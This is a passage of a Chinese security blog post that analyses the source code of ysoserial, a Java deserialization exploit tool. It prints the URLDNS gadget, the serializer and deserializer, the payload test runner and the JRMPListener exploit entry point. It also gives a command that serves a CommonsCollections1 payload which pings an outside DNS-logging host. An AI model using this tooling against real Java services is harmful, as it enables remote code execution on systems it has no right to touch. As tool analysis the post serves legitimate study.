<span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Serializer与Deserializer"><a href="#Serializer与Deserializer" class="headerlink" title="Serializer与Deserializer"></a>Serializer与Deserializer</h3><p>ysoserial的序列化和反序列化分别写在Serializer类与Deserializer类中。</p>
+<p>如前面所述GeneratePayload入口类的流程中，在获取到指定payload类的恶意构造的Gadget对象后，会调用Serializer类的serialize()函数进行序列化操作，看到源码就是Java原生的序列化操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class Serializer implements Callable&lt;byte[]&gt; &#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Object object;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Serializer</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.object = object;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">return</span> serialize(object);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">		<span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">		serialize(obj, out);</span><br><span class="line">		<span class="keyword">return</span> out.toByteArray();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">		objOut.writeObject(obj);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>与之对应的是Deserializer类，其中写了main()函数主要用于方便测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserializer</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Deserializer</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123; <span class="keyword">this</span>.bytes = bytes; &#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">		<span class="keyword">return</span> deserialize(in);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> InputStream in)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">		<span class="keyword">return</span> objIn.readObject();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> InputStream in = args.length == <span class="number">0</span> ? System.in : <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(args[<span class="number">0</span>]));</span><br><span class="line">		Object object = deserialize(in);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="exploit包"><a href="#exploit包" class="headerlink" title="exploit包"></a>exploit包</h3><p>前面都是说的由运行ysoserial中的主类函数即入口类GeneratePayload的整个调用流程，现在来看看运行ysoserial中的exploit类的整个调用流程。</p>
+<p>exploit包主要用于开启交互式服务，比如前面基本用法说到的开启JRMP服务端：<code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;ping -c 2  rce.267hqw.ceye.io&#39;</code></p>
+<p>这里以JRMPListener类为例说明，只看main()函数部分，其实就是调用Utils类makePayloadObject()函数来获取Gadget对象并设置到开启的交互式服务中，然后run()开启服务、等待客户端连接后发送包括Gadget的协议报文让客户端反序列化执行恶意命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( args.length &lt; <span class="number">3</span> ) &#123;</span><br><span class="line">        System.err.println(JRMPListener.class.getName() + <span class="string">" &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;"</span>);</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用Utils类makePayloadObject()函数来获取参数指定的payload类对象</span></span><br><span class="line">    <span class="comment">// 其中通过传入命令参数调用该指定payload类对象的getObject()方法，生成Gadget对象并返回</span></span><br><span class="line">    <span class="keyword">final</span> Object payloadObject = Utils.makePayloadObject(args[ <span class="number">1</span> ], args[ <span class="number">2</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> port = Integer.parseInt(args[ <span class="number">0</span> ]);</span><br><span class="line">        System.err.println(<span class="string">"* Opening JRMP listener on "</span> + port);</span><br><span class="line">        JRMPListener c = <span class="keyword">new</span> JRMPListener(port, payloadObject);</span><br><span class="line">        c.run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        System.err.println(<span class="string">"Listener error"</span>);</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">    Utils.releasePayload(args[<span class="number">1</span>], payloadObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参考文章的JRMPListener启动流程图，十分清晰：</p>
+<p><img src="/2021/10/22/ysoserial系列之工具浅析/4.png" alt=""></p>
+<h3 id="PayloadRunner测试类"><a href="#PayloadRunner测试类" class="headerlink" title="PayloadRunner测试类"></a>PayloadRunner测试类</h3><p>前面payloads包中说到了payload类的编写必须在main()函数中添加PayloadRunner测试方法，即调用PayloadRunner.run()函数。具体说明如注释：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用于从命令行本地运行漏洞利用的Gadget类</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unused"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PayloadRunner</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// 短暂替换JVM安全管理器为ExecCheckingSecurityManager来生成payload并返回序列化对象</span></span><br><span class="line">        <span class="comment">// 为了保证payload的生成过程不会抛出异常</span></span><br><span class="line">		<span class="keyword">byte</span>[] serialized = <span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;<span class="keyword">byte</span>[]&gt;()&#123;</span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">				<span class="keyword">final</span> String command = args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="keyword">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">				System.out.println(<span class="string">"generating payload object(s) for command: '"</span> + command + <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 获取payload对象</span></span><br><span class="line">				ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">                <span class="keyword">final</span> Object objBefore = payload.getObject(command);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 序列化payload对象并返回</span></span><br><span class="line">				System.out.println(<span class="string">"serializing payload"</span>);</span><br><span class="line">				<span class="keyword">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">				Utils.releasePayload(payload, objBefore);</span><br><span class="line">                <span class="keyword">return</span> ser;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 反序列化触发payload</span></span><br><span class="line">			System.out.println(<span class="string">"deserializing payload"</span>);</span><br><span class="line">			<span class="keyword">final</span> Object objAfter = Deserializer.deserialize(serialized);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取默认测试命令即运行打开计算器</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getDefaultTestCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">return</span> getFirstExistingFile(</span><br><span class="line">	        <span class="string">"C:\\Windows\\System32\\calc.exe"</span>,</span><br><span class="line">            <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>,</span><br><span class="line">            <span class="string">"/usr/bin/gnome-calculator"</span>,</span><br><span class="line">            <span class="string">"/usr/bin/kcalc"</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getFirstExistingFile</span><span class="params">(String ... files)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"calc.exe"</span>;</span><br><span class="line"><span class="comment">//        for (String path : files) &#123;</span></span><br><span class="line"><span class="comment">//            if (new File(path).exists()) &#123;</span></span><br><span class="line"><span class="comment">//                return path;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        throw new UnsupportedOperationException("no known test executable");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.anquanke.com/post/id/229108" target="_blank" rel="noopener">ysoserial 结构分析与使用</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ysoserial简介"><span class="toc-text">0x01 ysoserial简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-下载编译"><span class="toc-text">0x02 下载编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-基本用法"><span class="toc-text">0x03 基本用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-项目结构"><span class="toc-text">0x04 项目结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-源码浅析"><span class="toc-text">0x05 源码浅析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#入口类GeneratePayload"><span class="toc-text">入口类GeneratePayload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ObjectPayload-Utils类"><span class="toc-text">ObjectPayload.Utils类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payloads包"><span class="toc-text">payloads包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Serializer与Deserializer"><span class="toc-text">Serializer与Deserializer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit包"><span class="toc-text">exploit包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PayloadRunner测试类"><span class="toc-text">PayloadRunner测试类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-参考"><span class="toc-text">0x06 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/10/18/浅析利用Tomcat-ApplicationFilterChain类实现回显/" rel="next" title="浅析利用Tomcat ApplicationFilterChain类实现半通用回显">
+          浅析利用Tomcat ApplicationFilterChain类实现半通用回显
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2021/10/30/ysoserial系列之添加Tomcat半通用回显/" rel="prev" title="ysoserial系列之添加Tomcat半通用回显payload">
+            ysoserial系列之添加Tomcat半通用回显payload
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
